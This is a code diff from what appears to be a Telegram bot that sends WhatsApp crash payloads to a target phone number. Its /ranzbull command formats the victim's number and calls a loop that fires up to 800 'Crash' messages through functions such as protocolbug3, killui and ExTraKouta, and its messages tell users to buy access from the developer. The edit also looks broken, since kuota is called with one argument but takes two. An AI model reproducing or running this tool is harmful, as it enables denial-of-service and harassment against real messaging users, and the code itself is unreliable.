@@ -824,7 +824,7 @@ async function protocolbug3(target, mention) {
 
 
 
-async function delayBrutal(durationHours, target) { 
+async function kuota(durationHours, target) { 
 const totalDurationMs = durationHours * 60 * 60 * 1000;
 const startTime = Date.now(); let count = 0;
 
@@ -837,8 +837,7 @@ const sendNext = async () => {
     try {
         if (count < 800) {
             await Promise.all([
-            protocolbug3(target, false),
-            killui(target, Ptcp = true)
+            ExTraKouta(target)
             ]);
             console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
             count++;
@@ -1488,7 +1487,7 @@ bot.onText(/\/ranzbull (\d+)/, async (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   const targetNumber = match[1];
-                  const formatedNumber = numberTarget + "@s.whatsapp.net";
+                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
                   const jid = `${formattedNumber}@s.whatsapp.net`;
                   const randomImage = getRandomImage();
                   const userId = msg.from.id;
@@ -1543,8 +1542,7 @@ Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di baw
     
    
     console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-    await TrazKouta(formatedNumber);
-    await sleep(3000)
+    await kuota(jid);
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     
